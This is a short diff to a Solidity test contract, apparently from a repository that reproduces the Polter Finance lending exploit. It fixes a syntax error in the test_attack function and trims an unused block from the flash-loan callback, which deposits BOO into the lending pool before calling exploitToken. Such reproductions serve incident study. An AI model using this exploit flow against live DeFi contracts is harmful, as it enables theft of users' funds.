@@ -74,7 +74,7 @@ contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
         updateBalanceTracker(attacker);
     }
 
-    function test_attack()) external {
+    function test_attack() external {
         console.log('------- INITIAL BALANCES -------');
         logBalancesWithLabel('Attacker', attacker);
 
@@ -106,11 +106,6 @@ contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
     
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         BOO.approve(address(Lending), 1e18);
-        {
-            ILendingPool.ReserveData memory reserveData = Lending.getReserveData(address(BOO));
-            BOO.balanceOf(address(0x258345C300629198eDC37B169d3E1a0FEcCf09c1));
-        }
-
         Lending.deposit(address(BOO), 1e18, address(this), 0);
 
         exploitToken(WFTM);
